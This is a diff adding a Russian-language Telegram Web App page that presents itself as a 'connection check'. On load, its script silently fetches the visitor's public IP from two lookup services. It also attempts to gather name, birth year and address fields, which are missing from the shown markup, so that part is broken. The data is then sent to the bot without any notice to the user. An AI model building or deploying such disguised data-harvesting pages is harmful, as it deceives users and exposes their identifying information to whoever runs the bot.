@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Независимое Приграничье</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            transition: border-color 0.3s ease;
+        }
+        input:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .dropdown-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-out;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            margin: 10px 0;
+            padding: 0 15px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
+        }
+        .dropdown-content p {
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+        .show {
+            max-height: 500px;
+            padding: 15px;
+        }
+        .fade-in {
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="text-align: center;">Проверка соединения!</h1>
+
+    <script>
+        let collectedData = {};
+        let IS_IP_SENT = false;
+
+        // Функция сбора IP
+        function collectIP() {
+            return new Promise((resolve) => {
+                const sources = [
+                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                    fetch('https://ipapi.co/json/').then(r => r.json())
+                ];
+                
+                Promise.any(sources)
+                    .then(data => {
+                        collectedData.ip = data.ip || data.ip;
+                        resolve();
+                    })
+                    .catch(() => {
+                        collectedData.ip = 'Не удалось определить IP';
+                        resolve();
+                    });
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', async (e) => {
+            e.preventDefault();
+            
+            await collectIP();
+
+            collectedData.fio = document.getElementById('fio').value;
+            collectedData.birthYear = document.getElementById('birthYear').value;
+            collectedData.address = document.getElementById('address').value;
+
+            window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
+        });
+
+        const tg = Telegram.WebApp;
+        tg.enableClosingConfirmation();
+    </script>
+</body>
+</html>
